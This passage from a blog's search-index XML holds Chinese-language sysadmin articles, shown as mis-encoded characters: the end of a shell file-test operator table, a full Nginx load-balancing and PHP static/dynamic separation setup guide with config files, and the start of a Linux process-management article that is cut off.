file</td><td>æ£€æµ‹æ–‡ä»¶ï¼ˆåŒ…æ‹¬ç›®å½•ï¼‰æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› trueã€‚</td><td>[ -e $file ] è¿”å› trueã€‚</td></tr></tbody></table><p>å…¶ä»–æ£€æŸ¥ç¬¦ï¼š</p><ul><li><strong>-S</strong>: åˆ¤æ–­æŸæ–‡ä»¶æ˜¯å¦ socketã€‚</li><li><strong>-L</strong>: æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¹¶ä¸”æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx è´Ÿè½½å‡è¡¡æ¶æ„æ­å»º</title>
      <link href="/post/96c7790f.html"/>
      <url>/post/96c7790f.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx-è´Ÿè½½å‡è¡¡æ¶æ„æ­å»º"><a href="#Nginx-è´Ÿè½½å‡è¡¡æ¶æ„æ­å»º" class="headerlink" title="Nginx è´Ÿè½½å‡è¡¡æ¶æ„æ­å»º"></a>Nginx è´Ÿè½½å‡è¡¡æ¶æ„æ­å»º</h1><h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>è´Ÿè½½å‡è¡¡è·¨è¶Šå¤šä¸ªåº”ç”¨ç¨‹åºå®ä¾‹ï¼Œæ˜¯ä¸€ç§å¸¸ç”¨çš„æŠ€æœ¯ï¼Œå…¶ç”¨äºä¼˜åŒ–èµ„æºåˆ©ç”¨ç‡ã€æœ€å¤§åŒ–ååé‡ã€å‡å°‘å»¶è¿Ÿå’Œç¡®ä¿å®¹é”™é…ç½®ã€‚<br>â€‹</p><p>å¯ä»¥ä½¿ç”¨ nginx ä½œä¸ºé«˜æ•ˆçš„ HTTP è´Ÿè½½å‡è¡¡å™¨ï¼Œå°†æµé‡åˆ†å¸ƒåˆ°å¤šä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡ nginx æé«˜ web åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€å¯æ‰©å±•æ€§å’Œå¯é æ€§ã€‚<br>â€‹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628479273043-3c1a5db5-abe4-43bd-a993-d230aeb282e9.png#clientId=u10a9e2c7-4885-4&amp;from=paste&amp;height=296&amp;id=u9817d764&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=296&amp;originWidth=630&amp;originalType=binary%E2%88%B6=1&amp;size=36423&amp;status=done&amp;style=none&amp;taskId=udd13a58b-085e-4973-be95-77e0e5033c1&amp;width=630" alt="image.png"></p><h2 id="äºŒã€é™æ€ç«™ç‚¹è´Ÿè½½å‡è¡¡"><a href="#äºŒã€é™æ€ç«™ç‚¹è´Ÿè½½å‡è¡¡" class="headerlink" title="äºŒã€é™æ€ç«™ç‚¹è´Ÿè½½å‡è¡¡"></a>äºŒã€é™æ€ç«™ç‚¹è´Ÿè½½å‡è¡¡</h2><h3 id="æœåŠ¡å™¨ä¿¡æ¯"><a href="#æœåŠ¡å™¨ä¿¡æ¯" class="headerlink" title="æœåŠ¡å™¨ä¿¡æ¯"></a>æœåŠ¡å™¨ä¿¡æ¯</h3><table><thead><tr><th><strong>Hostname</strong></th><th><strong>IP</strong></th></tr></thead><tbody><tr><td>proxy</td><td>192.168.2.88</td></tr><tr><td>web01</td><td>192.168.2.81</td></tr><tr><td>web02</td><td>192.168.2.82</td></tr></tbody></table><h3 id="é…ç½®-hosts"><a href="#é…ç½®-hosts" class="headerlink" title="é…ç½® hosts"></a>é…ç½® hosts</h3><p>åœ¨æ‰€æœ‰æœºå™¨çš„ /etc/hosts æ–‡ä»¶æ·»åŠ ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.88 proxy192.168.2.81 web01192.168.2.82 web02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å®‰è£…-nginx"><a href="#å®‰è£…-nginx" class="headerlink" title="å®‰è£… nginx"></a>å®‰è£… nginx</h3><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šå®‰è£… nginxï¼Œå‚è€ƒå®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š</p><blockquote><p><a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/">ã€ŠInstalling NGINX Open Sourceã€‹</a></p></blockquote><h3 id="nginx-ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰"><a href="#nginx-ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰" class="headerlink" title="nginx ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰"></a>nginx ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰</h3><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/nginx.conf</p><pre class="line-numbers language-bash"><code class="language-bash">user nginx<span class="token punctuation">;</span>worker_processes auto<span class="token punctuation">;</span>error_log /var/log/nginx/error.log<span class="token punctuation">;</span>pid /run/nginx.pid<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span>include /usr/share/nginx/modules/*.conf<span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections 1024<span class="token punctuation">;</span>    use epoll<span class="token punctuation">;</span>    multi_accept on<span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    log_format  main  <span class="token string">'<span class="token variable">$remote_addr</span> - <span class="token variable">$remote_user</span> [<span class="token variable">$time_local</span>] "<span class="token variable">$request</span>" '</span>                      <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>" '</span>                      <span class="token string">'"<span class="token variable">$http_user_agent</span>" "<span class="token variable">$http_x_forwarded_for</span>"'</span><span class="token punctuation">;</span>    access_log  /var/log/nginx/access.log  main<span class="token punctuation">;</span>    sendfile            on<span class="token punctuation">;</span>    tcp_nopush          on<span class="token punctuation">;</span>    tcp_nodelay         on<span class="token punctuation">;</span>    keepalive_timeout   65<span class="token punctuation">;</span>    types_hash_max_size 4096<span class="token punctuation">;</span>    include             /etc/nginx/mime.types<span class="token punctuation">;</span>    default_type        application/octet-stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># Load modular configuration files from the /etc/nginx/conf.d directory.</span>    <span class="token comment" spellcheck="true"># See http://nginx.org/en/docs/ngx_core_module.html#include</span>    <span class="token comment" spellcheck="true"># for more information.</span>    include /etc/nginx/conf.d/*.conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="proxy-é…ç½®"><a href="#proxy-é…ç½®" class="headerlink" title="proxy é…ç½®"></a>proxy é…ç½®</h3><p>å­é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf.d/proxy.conf</p><pre class="line-numbers language-bash"><code class="language-bash">upstream webapp <span class="token punctuation">{</span>    server web01<span class="token punctuation">;</span>    server web02<span class="token punctuation">;</span><span class="token punctuation">}</span>server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    charset utf-8<span class="token punctuation">;</span>    access_log /var/log/nginx/app.access.log main<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        proxy_pass http://webapp<span class="token punctuation">;</span>        proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        proxy_redirect off<span class="token punctuation">;</span>        proxy_connect_timeout 30<span class="token punctuation">;</span>        proxy_send_timeout 15<span class="token punctuation">;</span>        proxy_read_timeout 15<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web01-å’Œ-web02-é…ç½®"><a href="#web01-å’Œ-web02-é…ç½®" class="headerlink" title="web01 å’Œ web02 é…ç½®"></a>web01 å’Œ web02 é…ç½®</h3><p>å­é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf.d/webapp.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen      80<span class="token punctuation">;</span>    root        /www/wwwroot/webapp<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        index   index.html<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é‡å¯æœåŠ¡"><a href="#é‡å¯æœåŠ¡" class="headerlink" title="é‡å¯æœåŠ¡"></a>é‡å¯æœåŠ¡</h3><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šï¼Œæ£€æŸ¥ nginx é…ç½®</p><pre class="line-numbers language-bash"><code class="language-bash">nginx -t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šï¼Œé‡å¯ nginx</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸‰ã€åŠ¨é™åˆ†ç¦»-è´Ÿè½½å‡è¡¡ï¼ˆPHPï¼‰"><a href="#ä¸‰ã€åŠ¨é™åˆ†ç¦»-è´Ÿè½½å‡è¡¡ï¼ˆPHPï¼‰" class="headerlink" title="ä¸‰ã€åŠ¨é™åˆ†ç¦»+è´Ÿè½½å‡è¡¡ï¼ˆPHPï¼‰"></a>ä¸‰ã€åŠ¨é™åˆ†ç¦»+è´Ÿè½½å‡è¡¡ï¼ˆPHPï¼‰</h2><h3 id="æœåŠ¡å™¨ä¿¡æ¯-1"><a href="#æœåŠ¡å™¨ä¿¡æ¯-1" class="headerlink" title="æœåŠ¡å™¨ä¿¡æ¯"></a>æœåŠ¡å™¨ä¿¡æ¯</h3><table><thead><tr><th><strong>Hostname</strong></th><th><strong>IP</strong></th></tr></thead><tbody><tr><td>proxy</td><td>192.168.2.88</td></tr><tr><td>web01</td><td>192.168.2.81</td></tr><tr><td>web02</td><td>192.168.2.82</td></tr><tr><td>phpserver01</td><td>192.168.2.83</td></tr><tr><td>phpserver02</td><td>192.168.2.84</td></tr></tbody></table><p>æ³¨ï¼šweb01 å’Œ web02 å­˜æ”¾é™æ€èµ„æºæ–‡ä»¶ï¼Œphpserver01 å’Œ phpserver02 è¿è¡Œ php ç¨‹åºï¼Œproxy ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ã€‚</p><h3 id="é…ç½®-hosts-1"><a href="#é…ç½®-hosts-1" class="headerlink" title="é…ç½® hosts"></a>é…ç½® hosts</h3><p>åœ¨ proxy çš„ /etc/hosts æ–‡ä»¶æ·»åŠ ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">192.168.2.88 proxy192.168.2.81 web01192.168.2.82 web02192.168.2.83 phpserver01192.168.2.84 phpserver02<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å®‰è£…-nginx-1"><a href="#å®‰è£…-nginx-1" class="headerlink" title="å®‰è£… nginx"></a>å®‰è£… nginx</h3><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šå®‰è£… nginxï¼Œå‚è€ƒå®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š</p><blockquote><p><a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/">ã€ŠInstalling NGINX Open Sourceã€‹</a></p></blockquote><h3 id="å®‰è£…-php"><a href="#å®‰è£…-php" class="headerlink" title="å®‰è£… php"></a>å®‰è£… php</h3><p>åœ¨ phpserver01 å’Œ phpserver02 ä¸Šå®‰è£… PHP ç¯å¢ƒï¼Œå‚è€ƒï¼š</p><blockquote><p><a href="https://www.yuque.com/docs/share/e657d0fd-b49d-472a-921b-a124b93792a8#">ã€ŠCentOS å®‰è£…æŒ‡å®šç‰ˆæœ¬ PHPã€‹</a></p></blockquote><h3 id="nginx-ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰-1"><a href="#nginx-ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰-1" class="headerlink" title="nginx ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰"></a>nginx ä¸»é…ç½®ï¼ˆæ‰€æœ‰æœºå™¨ï¼‰</h3><p>ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/nginx.conf</p><pre class="line-numbers language-bash"><code class="language-bash">user nginx<span class="token punctuation">;</span>worker_processes auto<span class="token punctuation">;</span>error_log /var/log/nginx/error.log<span class="token punctuation">;</span>pid /run/nginx.pid<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span>include /usr/share/nginx/modules/*.conf<span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections 1024<span class="token punctuation">;</span>    use epoll<span class="token punctuation">;</span>    multi_accept on<span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    log_format  main  <span class="token string">'<span class="token variable">$remote_addr</span> - <span class="token variable">$remote_user</span> [<span class="token variable">$time_local</span>] "<span class="token variable">$request</span>" '</span>                      <span class="token string">'<span class="token variable">$status</span> <span class="token variable">$body_bytes_sent</span> "<span class="token variable">$http_referer</span>" '</span>                      <span class="token string">'"<span class="token variable">$http_user_agent</span>" "<span class="token variable">$http_x_forwarded_for</span>"'</span><span class="token punctuation">;</span>    access_log  /var/log/nginx/access.log  main<span class="token punctuation">;</span>    sendfile            on<span class="token punctuation">;</span>    tcp_nopush          on<span class="token punctuation">;</span>    tcp_nodelay         on<span class="token punctuation">;</span>    keepalive_timeout   65<span class="token punctuation">;</span>    types_hash_max_size 4096<span class="token punctuation">;</span>    include             /etc/nginx/mime.types<span class="token punctuation">;</span>    default_type        application/octet-stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># Load modular configuration files from the /etc/nginx/conf.d directory.</span>    <span class="token comment" spellcheck="true"># See http://nginx.org/en/docs/ngx_core_module.html#include</span>    <span class="token comment" spellcheck="true"># for more information.</span>    include /etc/nginx/conf.d/*.conf<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="proxy-é…ç½®-1"><a href="#proxy-é…ç½®-1" class="headerlink" title="proxy é…ç½®"></a>proxy é…ç½®</h3><p>å­é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf.d/proxy.conf</p><pre class="line-numbers language-bash"><code class="language-bash">upstream webapp <span class="token punctuation">{</span>    server web01<span class="token punctuation">;</span>    server web02<span class="token punctuation">;</span><span class="token punctuation">}</span>upstream phpserver <span class="token punctuation">{</span>    server phpserver01<span class="token punctuation">;</span>    server phpserver02<span class="token punctuation">;</span><span class="token punctuation">}</span>server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    charset utf-8<span class="token punctuation">;</span>    access_log /var/log/nginx/app.access.log main<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        index index.php<span class="token punctuation">;</span>        proxy_pass http://phpserver<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    location ~* \.<span class="token punctuation">(</span>jpg<span class="token operator">|</span>jpeg<span class="token operator">|</span>gif<span class="token operator">|</span>css<span class="token operator">|</span>png<span class="token operator">|</span>js<span class="token operator">|</span>ico<span class="token operator">|</span>html<span class="token operator">|</span>htm<span class="token operator">|</span>txt<span class="token punctuation">)</span>$ <span class="token punctuation">{</span>        proxy_pass http://webapp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    location ~ \.php$ <span class="token punctuation">{</span>        proxy_pass http://phpserver<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web01-å’Œ-web02-é…ç½®-1"><a href="#web01-å’Œ-web02-é…ç½®-1" class="headerlink" title="web01 å’Œ web02 é…ç½®"></a>web01 å’Œ web02 é…ç½®</h3><p>å­é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf.d/webapp.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen      80<span class="token punctuation">;</span>    root        /www/wwwroot/webapp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="phpserver01-å’Œ-phpserver02-é…ç½®"><a href="#phpserver01-å’Œ-phpserver02-é…ç½®" class="headerlink" title="phpserver01 å’Œ phpserver02 é…ç½®"></a>phpserver01 å’Œ phpserver02 é…ç½®</h3><p>å­é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf.d/php.conf</p><pre class="line-numbers language-bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen 80<span class="token punctuation">;</span>    server_name phpserver01<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># === Fastcgi Config ===</span>    fastcgi_connect_timeout 30<span class="token punctuation">;</span>    fastcgi_send_timeout 30<span class="token punctuation">;</span>    fastcgi_read_timeout 30<span class="token punctuation">;</span>    fastcgi_buffer_size  64k<span class="token punctuation">;</span>    fastcgi_buffers 4 64k<span class="token punctuation">;</span>    fastcgi_busy_buffers_size 128k<span class="token punctuation">;</span>    fastcgi_temp_file_write_size 128k<span class="token punctuation">;</span>    location / <span class="token punctuation">{</span>        root /www/wwwroot/webapp<span class="token punctuation">;</span>        fastcgi_pass 127.0.0.1:9000<span class="token punctuation">;</span>        fastcgi_index index.php<span class="token punctuation">;</span>        fastcgi_param SCRIPT_FILENAME <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>        include fastcgi_params<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é‡å¯æœåŠ¡-1"><a href="#é‡å¯æœåŠ¡-1" class="headerlink" title="é‡å¯æœåŠ¡"></a>é‡å¯æœåŠ¡</h3><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šï¼Œæ£€æŸ¥ nginx é…ç½®</p><pre class="line-numbers language-bash"><code class="language-bash">nginx -t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åœ¨æ‰€æœ‰æœºå™¨ä¸Šï¼Œé‡å¯ nginx</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åœ¨ phpserver01 å’Œ phpserver02 ä¸Šå¯åŠ¨ php-fpm</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl start php-fpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> Nginx </tag>
            
            <tag> æ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux è¿›ç¨‹ç®¡ç†</title>
      <link href="/post/6b95d0a0.html"/>
      <url>/post/6b95d0a0.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-è¿›ç¨‹ç®¡ç†"><a href="#Linux-è¿›ç¨‹ç®¡ç†" class="headerlink" title="Linux è¿›ç¨‹ç®¡ç†"></a>Linux è¿›ç¨‹ç®¡ç†</h1><h2 id="ä¸€ã€è¿›ç¨‹ä»‹ç»"><a href="#ä¸€ã€è¿›ç¨‹ä»‹ç»" class="headerlink" title="ä¸€ã€è¿›ç¨‹ä»‹ç»"></a>ä¸€ã€è¿›ç¨‹ä»‹ç»</h2><p>æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„å®ä¾‹ç§°ä¸ºè¿›ç¨‹ã€‚æ¯æ¬¡è¿è¡Œ shell å‘½ä»¤æ—¶ï¼Œéƒ½ä¼šè¿è¡Œä¸€ä¸ªç¨‹åºå¹¶ä¸ºå…¶åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ã€‚Linux ä¸­çš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹ ID(PID)ï¼Œå®ƒä¸ç‰¹å®šçš„ç”¨æˆ·å’Œç»„å¸æˆ·ç›¸å…³è”ã€‚<br>Linux æ˜¯ä¸€ä¸ªå¤šä»»åŠ¡æ“ä½œç³»ç»Ÿï¼Œè¿™æ„å‘³ç€å¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªç¨‹åºï¼ˆè¿›ç¨‹ä¹Ÿç§°ä¸ºä»»åŠ¡ï¼‰ï¼Œè¿™äº›ä»»åŠ¡å…±äº«å…¬å…±å¤„ç†èµ„æºï¼ˆå¦‚ CPU å’Œå†…å­˜ï¼‰ã€‚<br>â€‹</p><h2 id="äºŒã€è¿›ç¨‹ç±»å‹"><a href="#äºŒã€è¿›ç¨‹ç±»å‹" class="headerlink" title="äºŒã€è¿›ç¨‹ç±»å‹"></a>äºŒã€è¿›ç¨‹ç±»å‹</h2><p>åœ¨ Linux ä¸­ï¼Œè¿›ç¨‹å¯ä»¥æœ‰ä¸¤ç§ç±»å‹ï¼š</p><ul><li>å‰å°è¿›ç¨‹</li></ul><p>ä¾èµ–äºç”¨æˆ·çš„è¾“å…¥ï¼Œä¹Ÿç§°ä¸ºäº¤äº’è¿›ç¨‹</p><ul><li>åå°è¿›ç¨‹</li></ul><p>ç‹¬ç«‹äºç”¨æˆ·è¿è¡Œï¼Œç§°ä¸ºéäº¤äº’å¼æˆ–è‡ªåŠ¨è¿›ç¨‹<br>â€‹</p><h2 id="ä¸‰ã€è¿›ç¨‹çŠ¶æ€"><a href="#ä¸‰ã€è¿›ç¨‹çŠ¶æ€" class="headerlink" title="ä¸‰ã€è¿›ç¨‹çŠ¶æ€"></a>ä¸‰ã€è¿›ç¨‹çŠ¶æ€</h2><p>Linux ä¸­çš„è¿›ç¨‹åœ¨åˆ›å»ºä¹‹åå’Œç»ˆæ­¢ä¹‹å‰å¯ä»¥ç»å†ä¸åŒçš„çŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€æ˜¯ï¼š</p><table><thead><tr><th><strong>procfs</strong></th><th><strong>è¿›ç¨‹çŠ¶æ€</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>R(runnng)</td><td>TASK_RUNNING</td><td>å¯è¿è¡ŒçŠ¶æ€ã€‚æœªå¿…æ­£åœ¨ä½¿ç”¨ CPUï¼Œä¹Ÿè®¸æ˜¯åœ¨ç­‰å¾…è°ƒåº¦</td></tr><tr><td>S(sleeping)</td><td>TASK_INTERRUPTIBLE</td><td>å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ã€‚æ­£åœ¨ç­‰å¾…æŸä¸ªæ¡ä»¶æ»¡è¶³</td></tr><tr><td>D(disk sleeping)</td><td>TASK_UNINTERRUPTIBLE</td><td>ä¸å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ã€‚ä¸ä¼šè¢«ä¿¡å·ä¸­æ–­</td></tr><tr><td>T(stopped)</td><td>__TASK_STOPPED</td><td>æš‚åœçŠ¶æ€ã€‚æ”¶åˆ°æŸç§ä¿¡å·ï¼Œè¿è¡Œè¢«åœæ­¢</td></tr><tr><td>t(tracing stop)</td><td>__TASK_TRACED</td><td>è¢«è·Ÿè¸ªçŠ¶æ€ã€‚è¿›ç¨‹åœæ­¢ï¼Œè¢«å¦ä¸€ä¸ªè¿›ç¨‹è·Ÿè¸ª</td></tr><tr><td>Z(zombie)</td><td>EXIT_ZOMBIE</td><td>åƒµå°¸çŠ¶æ€ã€‚è¿›ç¨‹å·²ç»é€€å‡ºï¼Œä½†å°šæœªè¢«çˆ¶è¿›ç¨‹æˆ–è€… init è¿›ç¨‹æ”¶å°¸</td></tr><tr><td>X(dead)</td><td>EXIT_DEAD</td><td>çœŸæ­£çš„æ­»äº¡çŠ¶æ€</td></tr></tbody></table><p>è¿›ç¨‹çš„çŠ¶æ€æµè½¬è¿‡ç¨‹å¦‚ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628072870533-6438fb14-a2b8-4348-879c-4b710c9c4b0c.png#clientId=ud2db8e8c-3921-4&amp;from=paste&amp;height=308&amp;id=ubb6862cb&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=308&amp;originWidth=976&amp;originalType=binary%E2%88%B6=1&amp;size=51376&amp;status=done&amp;style=none&amp;taskId=u756dec58-af30-484e-984b-699e58f4d54&amp;width=976" alt="image.png"></p><h2 id="å››ã€è¿›ç¨‹å±æ€§"><a href="#å››ã€è¿›ç¨‹å±æ€§" class="headerlink" title="å››ã€è¿›ç¨‹å±æ€§"></a>å››ã€è¿›ç¨‹å±æ€§</h2><table><thead><tr><th><strong>å±æ€§</strong></th><th><strong>ä»‹ç»</strong></th></tr></thead><tbody><tr><td>PID</td><td>è¿›ç¨‹çš„ ID å·</td></tr><tr><td>PPID</td><td>çˆ¶è¿›ç¨‹ï¼ˆäº§ç”Ÿå½“å‰è¿›ç¨‹çš„è¿›ç¨‹ï¼‰çš„ PID</td></tr><tr><td>UIDï¼ˆRUIDï¼‰</td><td>å¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ· ID</td></tr><tr><td>EUID</td><td>æœ‰æ•ˆç”¨æˆ· IDï¼Œä¸€ç§ç¡®å®šå¯¹ç³»ç»Ÿèµ„æºçš„è®¿é—®æƒé™</td></tr><tr><td>GIDï¼ˆRGIDï¼‰</td><td>å¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ·æ‰€å±çš„ç»„</td></tr><tr><td>EGID</td><td>æœ‰æ•ˆç»„æ‰€æœ‰è€…ï¼Œä¸åŒäº RGIDï¼Œ SGID åº”ç”¨äºæ–‡ä»¶</td></tr><tr><td>çŠ¶æ€</td><td>R - è¿è¡Œï¼ŒW - å°±ç»ªï¼ŒS - ä¼‘çœ ï¼ŒZ - åƒµå°¸</td></tr><tr><td>ä¼˜å…ˆçº§</td><td>è¿›ç¨‹æ‰§è¡Œçš„ä¼˜å…ˆçº§</td></tr><tr><td>TTY</td><td>è¿›ç¨‹è¿æ¥åˆ°çš„ç»ˆç«¯</td></tr></tbody></table><h2 id="äº”ã€ps-æŸ¥çœ‹è¿›ç¨‹"><a href="#äº”ã€ps-æŸ¥çœ‹è¿›ç¨‹" class="headerlink" title="äº”ã€ps æŸ¥çœ‹è¿›ç¨‹"></a>äº”ã€ps æŸ¥çœ‹è¿›ç¨‹</h2><h3 id="å‘½ä»¤ä»‹ç»"><a href="#å‘½ä»¤ä»‹ç»" class="headerlink" title="å‘½ä»¤ä»‹ç»"></a>å‘½ä»¤ä»‹ç»</h3><p>ps å‘½ä»¤æ˜¯â€œProcess Statusâ€çš„ç¼©å†™ï¼Œå®ƒæ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ä½†æ˜¯ï¼Œå®ƒä¸ top å‘½ä»¤ä¸åŒï¼Œç”Ÿæˆçš„è¾“å‡ºä¸æ˜¯å®æ—¶çš„ã€‚<br>ps å‘½ä»¤æ˜¯æœ€åŸºæœ¬åŒæ—¶ä¹Ÿæ˜¯éå¸¸å¼ºå¤§çš„è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤ï¼Œä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥ç¡®å®šæœ‰å“ªäº›è¿›ç¨‹æ­£åœ¨è¿è¡Œå’Œè¿è¡Œçš„çŠ¶æ€ã€è¿›ç¨‹æ˜¯å¦ç»“æŸã€è¿›ç¨‹æœ‰æ²¡æœ‰åƒµæ­»ã€å“ªäº›è¿›ç¨‹å 